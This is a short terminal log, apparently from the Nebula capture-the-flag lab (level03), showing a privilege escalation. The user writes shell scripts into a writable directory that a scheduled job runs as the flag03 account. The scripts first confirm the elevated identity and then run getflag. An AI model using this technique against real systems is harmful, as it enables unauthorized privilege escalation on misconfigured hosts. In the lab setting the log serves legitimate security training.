```
level03@nebula:/home/flag03/writable.d$ cat << EOF > blip.sh
> #!/bin/bash
> id > /tmp/whoami
> EOF
level03@nebula:/home/flag03/writable.d$

[wait a couple of minutes]

level03@nebula:/home/flag03/writable.d$ cat /tmp/whoami
uid=996(flag03) gid=996(flag03) groups=996(flag03)




level03@nebula:/home/flag03/writable.d$ cat << EOF > blip.sh
> #!/bin/bash
> /bin/getflag > /tmp/getflag
> EOF

[wait a couple of minutes]

level03@nebula:/home/flag03/writable.d$ cat /tmp/getflag
You have successfully executed getflag on a target account
```
